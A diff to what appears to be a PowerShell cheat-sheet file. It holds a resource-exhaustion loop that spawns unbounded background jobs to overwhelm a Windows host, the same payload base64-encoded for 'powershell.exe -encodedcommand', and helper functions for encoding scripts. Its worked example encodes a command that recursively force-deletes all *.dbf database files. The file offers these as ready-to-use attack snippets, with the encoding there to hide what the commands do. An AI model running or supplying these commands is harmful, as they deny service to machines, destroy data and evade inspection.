@@ -1,3 +1,28 @@
 #resource exhaustion
 
 while(1 -eq 1){start-job{while(1 -eq 1){$data = ls -recurse C:\windows}}}
+
+#above command base64 encoded, ready for powershell.exe -encodedcommand {base64}
+dwBoAGkAbABlACgAMQAgAC0AZQBxACAAMQApAHsAcwB0AGEAcgB0AC0AagBvAGIAewB3AGgAaQBsAGUAKAAxACAALQBlAHEAIAAxACkAewAkAGQAYQB0AGEAIAA9ACAAbABzACAALQByAGUAYwB1AHIAcwBlACAAQwA6AFwAdwBpAG4AZABvAHcAcwB9AH0AfQA=
+
+
+##base64 interaction
+
+#encode string to base64 function
+
+function stringtobase64($thestring){[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$thestring"))}
+
+#decode base64 to string
+
+function base64tostring($thestring){[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($thestring))}
+
+#convert a script into base64 to be passed to powershell.exe -encodedcommand {base64}
+
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes({REPLACE_THIS_WITH_EXPRESSION}.toString()))
+
+~Example
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes({Get-ChildItem -Recurse -Filter "*.dbf" | remove-item -Force}.toString()))
+
+~Result:
+RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBpAGwAdABlAHIAIAAiACoALgBkAGIAZgAiACAAfAAgAHIAZQBtAG8AdgBlAC0AaQB0AGUAbQAgAC0ARgBvAHIAYwBlAA==
+
